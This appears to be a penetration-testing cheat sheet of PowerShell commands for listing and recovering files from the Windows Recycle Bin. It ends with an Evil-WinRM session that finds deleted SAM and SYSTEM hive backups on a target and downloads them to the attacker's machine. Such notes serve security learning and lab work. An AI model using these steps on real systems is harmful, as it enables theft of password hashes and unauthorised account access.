Access the Recycle Bin using the Shell COM object
```
$shell = New-Object -ComObject Shell.Application
$rb = $shell.Namespace(10)
```
List items currently in the Recycle Bin
```
$rb.Items() | ForEach-Object { $_.Name }
```
Inspect file properties
```
$item = $rb.Items()
PS C:\> $item

Application  : System.__ComObject
Parent       : System.__ComObject
Name         : wapt-backup-sunday.7z
Path         : C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z
GetLink      : 
GetFolder    : 
IsLink       : False
IsFolder     : False
IsFileSystem : True
IsBrowsable  : False
ModifyDate   : 10/24/2024 9:16:29 PM
Size         : 30416987
Type         : 7Z File
```
Get the current user's SID (Security Identifier)
```
$SID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
```
Remarks: Each user has a separate folder inside the Recycle Bin
Set the user-specific Recycle Bin path
```
$RecyclePath = "C:\`$Recycle.Bin\$SID"
```
List all deleted files in the user's Recycle Bin
```
Get-ChildItem -Path $RecyclePath -Force | Where-Object { $_.Name -like '$R*' }
```
Copy a deleted file from the Recycle Bin (use quotes!)
```
Copy-Item 'C:\$Recycle.Bin\<UserSID>\$REXXXXX.ext' -Destination 'C:\Path\To\Restore\file.ext'
```

Alternatively: copy and download the file
```
cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir


    Directory: C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak

*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy * C:\Users\Jareth\Downloads

download sam.bak
Info: Downloading C:\Users\Jareth\Downloads\sam.bak to sam.bak
Info: Download successful!
download system.bak
Info: Downloading C:\Users\Jareth\Downloads\system.bak to system.bak
Info: Download successful!
```